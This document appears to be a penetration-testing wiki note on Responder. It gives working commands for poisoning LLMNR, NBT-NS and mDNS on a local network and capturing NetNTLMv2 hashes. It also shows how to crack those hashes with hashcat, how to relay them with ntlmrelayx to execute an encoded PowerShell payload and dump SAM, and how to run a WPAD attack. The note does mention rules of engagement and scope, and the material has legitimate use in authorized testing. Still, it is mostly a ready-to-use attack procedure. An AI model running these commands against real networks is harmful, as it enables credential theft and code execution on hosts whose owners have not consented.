---
title: "Responder"
type: tool
tags: [active-directory, ntlm, poisoning, credential-capture, relay, mitm]
date_created: 2026-06-16
date_updated: 2026-06-16
sources: []
---

## Purpose

**Responder** poisons broadcast name-resolution protocols (LLMNR, NBT-NS, mDNS) to make victims authenticate to you, capturing NetNTLMv2 hashes (crack offline) or relaying them to other hosts for code execution. The classic internal-network foothold when you have no creds.

## Install / setup

```bash
apt install responder        # or git clone github.com/lgandx/Responder
# config: /etc/responder/Responder.conf  (or ./Responder.conf)
```

## Core usage

```bash
responder -I eth0            # poison + run rogue servers (SMB/HTTP/etc)
responder -I eth0 -A         # ANALYZE mode: passive, see who's vulnerable, poison NOTHING
```

## Common use cases

```bash
# Capture NetNTLMv2 -> crack
responder -I eth0
# hashes land in /usr/share/responder/logs/  and print to console
hashcat -m 5600 ntlmv2.txt rockyou.txt -r rules/best64.rule    # [[hashcat]]

# Relay instead of crack (signing must be OFF on the target)
#   1. disable Responder's SMB + HTTP servers in Responder.conf (SMB = Off, HTTP = Off)
#   2. run the relay:
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc <b64>"
#   3. Responder poisons -> victim auth -> relayed to targets -> exec / SAM dump

# WPAD attack (proxy auto-config) for broader capture
responder -I eth0 -wF
```

## Tips and gotchas
- **Run `-A` (analyze) first** on a new network to see what's poisonable without touching anything (safe, and respects `passive_only` RoE).
- For **relay**, turn OFF Responder's own SMB/HTTP listeners or they collide with `ntlmrelayx`. Relay needs SMB signing disabled on the target (find with `nxc smb <range> --gen-relay-list` / BloodHound).
- NetNTLMv2 cannot be passed-the-hash - it must be cracked or relayed.
- Loud and disruptive: poisoning can break legit name resolution. Respect `no_dos` / scope; coordinate on production.

## Related techniques
[[active-directory]], [[ad-lateral-movement]], `ntlm-relay-smb-signing-disabled`. Pairs with [[impacket]] (ntlmrelayx), [[hashcat]], [[netexec]] (relay-list + signing check). Used by the `hunt-ad` skill.

## Sources
